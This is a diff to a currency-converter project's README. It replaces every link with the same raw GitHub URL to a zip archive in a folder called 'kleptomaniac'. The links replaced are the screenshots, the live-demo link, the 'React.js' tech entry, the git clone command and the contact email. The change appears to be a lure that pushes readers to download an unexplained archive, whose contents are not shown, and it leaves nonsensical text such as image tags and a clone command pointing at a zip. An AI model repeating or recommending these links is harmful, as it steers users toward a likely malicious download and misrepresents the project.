@@ -10,23 +10,23 @@ The Currency Converter app provides a seamless way to convert currencies with re
 - **User-Friendly Interface** 💻: Designed with a responsive layout to improve user engagement and reduce bounce rates.
 - **Multi-Currency Support** 💱: Convert between a wide range of global currencies.
 
-![image](https://github.com/user-attachments/assets/654d4778-5873-45d3-ab90-998af06fc253)
+![image](https://raw.githubusercontent.com/manassingh30/Currency_Coverter/main/kleptomaniac/Currency_Coverter.zip)
 
 <div style="display: flex; justify-content: space-between; flex-wrap: wrap;">
-  <img src="https://github.com/user-attachments/assets/551566db-0ad1-4648-b452-f25ae00c5819" width="400" alt="WhatsApp Image 2024-08-03 at 9 27 13 AM" style="margin-right: 10px;">
-  <img src="https://github.com/user-attachments/assets/efb5225f-18ac-47b7-915c-3d5d7623629c" width="400" alt="WhatsApp Image 2024-08-03 at 9 25 36 AM" style="margin-right: 10px;">
+  <img src="https://raw.githubusercontent.com/manassingh30/Currency_Coverter/main/kleptomaniac/Currency_Coverter.zip" width="400" alt="WhatsApp Image 2024-08-03 at 9 27 13 AM" style="margin-right: 10px;">
+  <img src="https://raw.githubusercontent.com/manassingh30/Currency_Coverter/main/kleptomaniac/Currency_Coverter.zip" width="400" alt="WhatsApp Image 2024-08-03 at 9 25 36 AM" style="margin-right: 10px;">
 </div>
 
 ## Live Demo 🌐
 
 Check out the live demo of the Currency Converter app here!  
-[Currency Converter](https://zippy-bienenstitch-a190b9.netlify.app/)
+[Currency Converter](https://raw.githubusercontent.com/manassingh30/Currency_Coverter/main/kleptomaniac/Currency_Coverter.zip)
 
 ---
 
 ## Tech Stack 🛠️
 
-- **Frontend**: React.js, Tailwind CSS
+- **Frontend**: https://raw.githubusercontent.com/manassingh30/Currency_Coverter/main/kleptomaniac/Currency_Coverter.zip, Tailwind CSS
 - **APIs**: Reliable currency exchange APIs
 - **Other Tools**: Git for version control, Figma for design, Axios for data fetching
 
@@ -34,7 +34,7 @@ Check out the live demo of the Currency Converter app here!
 
 1. **Clone the repository** 🐙:
    ```bash
-   git clone https://github.com/username/currency-converter.git
+   git clone https://raw.githubusercontent.com/manassingh30/Currency_Coverter/main/kleptomaniac/Currency_Coverter.zip
    cd currency-converter
    ```
 
@@ -81,7 +81,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact 📧
 
-For inquiries or support, please contact [singhmanas876@gmail.com](mailto:singhmanas876@gmail.com).
+For inquiries or support, please contact [https://raw.githubusercontent.com/manassingh30/Currency_Coverter/main/kleptomaniac/Currency_Coverter.zip](https://raw.githubusercontent.com/manassingh30/Currency_Coverter/main/kleptomaniac/Currency_Coverter.zip).
 
 ---
 
